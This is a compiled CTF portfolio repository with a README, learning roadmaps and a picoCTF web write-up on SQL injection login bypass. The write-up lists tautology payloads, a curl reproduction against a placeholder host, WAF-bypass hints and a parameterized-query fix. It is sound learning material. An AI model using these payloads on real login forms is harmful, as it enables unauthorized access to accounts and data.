<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-gabegiancarlo
description: CTF writeups and security challenges by GabeGiancarlo.
---

# Writeups by GabeGiancarlo

Source repository: `/repos/GabeGiancarlo`

## Repository Index

- ctf-bugbounty-lab/README.md
- ctf-bugbounty-lab/roadmap/advanced.md
- ctf-bugbounty-lab/roadmap/beginner.md
- ctf-bugbounty-lab/roadmap/intermediate.md
- ctf-bugbounty-lab/challenges/picoCTF/2024/web/sqli-bypass/README.md

## Writeup Content


### File: ctf-bugbounty-lab/README.md

# ctf-bugbounty-showcase

A personal portfolio of CTF solutions, bug bounty reports, and hacking tools for learning, earning, and career demonstration.

![CTF Write-ups](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/GabeGiancarlo/ctf-bugbounty-showcase/main/assets/badges/challenges_count.json)
![Bounties](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/GabeGiancarlo/ctf-bugbounty-showcase/main/assets/badges/bounties_count.json)

> Replace `GabeGiancarlo` above with your GitHub username or org after you push the repo.

## Navigation
- `challenges/`: CTF write-ups by platform/year/category/challenge
- `bounties/`: Redacted bug bounty reports by program
- `tools/`: Scripts and utilities to aid recon/exploitation
- `roadmap/`: Learning paths (beginner → advanced)
- `assets/`: Images, badges, and supporting files

## Write-ups
| Platform | Year | Category | Challenge | Link |
| --- | --- | --- | --- | --- |
| picoCTF | 2024 | web | sqli-bypass | [write-up](challenges/picoCTF/2024/web/sqli-bypass/README.md) |

## Bounties
| Program | Date | Title | Link |
| --- | --- | --- | --- |
| (redacted) | (YYYY-MM) | Placeholder | (pending) |

## Tools
- Subdomain enumeration: [`tools/subdomain-enum.py`](tools/subdomain-enum.py)

## Roadmap
- Beginner: [`roadmap/beginner.md`](roadmap/beginner.md)
- Intermediate: [`roadmap/intermediate.md`](roadmap/intermediate.md)
- Advanced: [`roadmap/advanced.md`](roadmap/advanced.md)

## Badges
Badges are auto-updated by a GitHub Actions workflow that counts write-ups and updates JSON badge endpoints in `assets/badges/`.

## Template Usage
Use this as a template for your own portfolio:
1. Click "Use this template" on GitHub or clone this repo.
2. Replace `GabeGiancarlo` in the badge URLs with your username/org.
3. Add new challenge write-ups under `challenges/<platform>/<year>/<category>/<challenge>/README.md`.
4. Add redacted bounty write-ups under `bounties/<program>/YYYY-MM-title.md`.
5. Add tools to `tools/` and link them here.
6. Update roadmaps as you learn.
7. Push to GitHub; the `update-badges` workflow will keep counts fresh.

## License
MIT — see [`LICENSE`](LICENSE).



### File: ctf-bugbounty-lab/challenges/picoCTF/2024/web/sqli-bypass/README.md

# picoCTF 2024 — Web — sqli-bypass

- Category: Web
- Points: 100 (sample)
- Objective: Bypass login using SQL injection.

## Summary
The login form is vulnerable to classic SQLi in the `username` field. Using a tautology with SQL comment bypasses password verification and returns an authenticated session.

## Steps
1. Intercept the request with a proxy (e.g., Burp) or use curl.
2. Submit a payload that forces a true condition and comments out the rest of the query.

## Payloads Tested
- `' OR '1'='1' -- `
- `admin' OR 1=1 -- `
- `admin'/*` (for WAF probing)

Most likely backend query:
```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<hash>';
```

Working login input:
```
username: ' OR '1'='1' -- 
password: anything
```

This turns the query into:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '<hash>';
```

## Reproduction (curl)
```bash
curl -i -X POST \
  -d "username=' OR '1'='1' -- " \
  -d "password=test" \
  https://example-ctf-site/login
```

Expected result: 200 OK with a session cookie indicating an authenticated state.

## Code Snippet (Sanitization Fix Example)
```python
# Example fix (parameterized queries)
import sqlite3

def authenticate(db, username, password):
    cur = db.cursor()
    cur.execute("SELECT id FROM users WHERE username = ? AND password = ?", (username, password))
    return cur.fetchone() is not None
```

## Flag
```
picoCTF{example_flag_sqli_2024}
```

## Notes
- Prefer parameterized queries over manual escaping.
- Consider WAF/IDS bypass techniques if filtering is present (encoded comments, case toggling, whitespace variations).



### File: ctf-bugbounty-lab/roadmap/advanced.md

# Advanced Roadmap

- Advanced Web
  - Deserialization, cache poisoning, race conditions
  - Sandbox escapes, prototype pollution, template injection
- Infra/Cloud
  - AWS security basics, misconfig exploitation
  - Container/K8s security
- Exploit Dev (Intro)
  - Memory corruption, ROP basics
- Scale & Ops
  - Automation pipelines, corpus generation, fuzzing
- Practice
  - HTB (hard), CTFtime events
- Professional
  - Program selection, scope management, triage strategies



### File: ctf-bugbounty-lab/roadmap/beginner.md

# Beginner Roadmap

- Foundations
  - Linux basics, shell, editors (vim/nano)
  - Networking: TCP/IP, DNS, HTTP
- Web Basics
  - HTML/CSS/JS fundamentals
  - HTTP methods, cookies, sessions
- Security Intro
  - OWASP Top 10 overview
  - Common vulns: XSS, SQLi, IDOR
- Tools
  - Burp Suite Community, curl, nmap
- Practice
  - picoCTF, OverTheWire Bandit
- Reading
  - PortSwigger Web Security Academy (intro tracks)



### File: ctf-bugbounty-lab/roadmap/intermediate.md

# Intermediate Roadmap

- Web App Security
  - AuthN/AuthZ, JWT, CSRF, SSRF
  - SQLi (UNION-based, blind), XSS (stored/reflected/DOM)
- Recon & Automation
  - Subdomain enum, dir brute, parameter discovery
  - Scripting with Python/JS
- Mobile/API
  - Basic Android/iOS analysis
  - REST/GraphQL security
- Practice
  - Hack The Box (easy/medium), TryHackMe
  - PortSwigger labs (intermediate)
- Reporting
  - Writing clear PoCs and impact statements

